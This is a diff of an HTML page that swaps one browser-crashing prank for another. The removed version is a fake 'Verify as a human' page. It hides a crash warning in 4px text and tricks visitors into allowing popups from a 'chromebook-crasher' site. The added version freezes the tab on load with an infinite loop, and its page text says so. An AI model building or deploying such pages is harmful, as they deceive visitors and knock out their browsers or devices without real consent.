@@ -1,93 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>
-  home
-    </title>
-    <style>
-        /* Center the content on the screen */
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        /* Card container style */
-        .card {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-
-        h1 {
-            color: #333333;
-            margin-bottom: 10px;
-        }
-
-        p {
-            color: #666666;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-
-        /* The Proceed Button styling */
-        .proceed-btn {
-            background-color: #007bff;
-            color: #ffffff;
-            border: none;
-            padding: 14px 28px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.1s ease;
-            width: 100%;
-        }
-
-        /* Hover effect */
-        .proceed-btn:hover {
-            background-color: #0056b3;
-        }
-
-        /* Click effect */
-        .proceed-btn:active {
-            transform: scale(0.98);
-        }
-    </style>
+    <title>Total Lag Test</title>
 </head>
 <body>
-
-    <div class="card">
-        <h1>Verify as a human</h1>
-        <p style="font-size: 4px;">By pressing this button, you hearby agree to crashing your device</p>
-        
-        <!-- Action Button -->
-        <button class="proceed-btn" onclick="handleProceed()">Proceed</button>
-    </div>
-
+    <h1>This page will freeze instantly</h1>
+    
     <script>
-        // Function that handles the button click
-        function handleProceed() {
-            // Added the size specifications to the windowFeatures parameter
-            let windowRef = window.open(
-                "https://moocow-web.github.io/chromebook-crasher/popup.html", 
-                "_blank", 
-                "width=300,height=400"
-            );
-            
-            alert("In order to proceed with verification, please select 'Allow Popups' and reload the page");
+        // WARNING: This will crash or freeze this specific browser tab
+        while(true) {
+            // Main thread is 100% blocked forever
         }
     </script>
-
 </body>
 </html>
